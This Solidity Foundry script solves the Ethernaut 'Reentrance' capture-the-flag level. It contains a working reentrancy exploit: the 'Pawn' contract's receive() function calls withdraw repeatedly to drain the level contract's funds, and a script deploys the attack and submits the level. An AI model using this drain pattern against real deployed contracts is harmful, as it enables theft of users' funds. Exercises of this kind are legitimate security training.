// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";

import {Vm, console, Attacker} from "../src/Attacker.sol";
// import {Reentrance} from "../src/Reentrance.sol";

abstract contract Reentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable virtual;
    function balanceOf(address _who)
        public
        view
        virtual
        returns (uint256 balance);
    function withdraw(uint256 _amount) public virtual;
    receive() external payable {}
}

/**
 *
 * Level address: 0x2a24869323C0B13Dff24E196Ba072dC790D52479
 *  The goal of this level is for you to steal all the funds from the contract.
 *
 *   Things that might help:
 *
 * Untrusted contracts can execute code where you least expect it.
 * Fallback methods
 * Throw/revert bubbling
 * Sometimes the best way to attack a contract is with another contract.
 *
 */
contract Pawn {
    Reentrance private victim;

    constructor(Reentrance _victim) {
        victim = _victim;
    }

    function attack() public payable {
        victim.donate{value: msg.value}(address(this));
        victim.withdraw(msg.value);
    }

    receive() external payable {
        msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
    }
}

contract ReentranceScript is Attacker {
    Level private level = Level(0x2a24869323C0B13Dff24E196Ba072dC790D52479);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level, 0.001 ether);
        Reentrance reentrance = Reentrance(payable(instance));
        Pawn pawn = new Pawn(reentrance);
        pawn.attack{value: 0.001 ether}();

        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
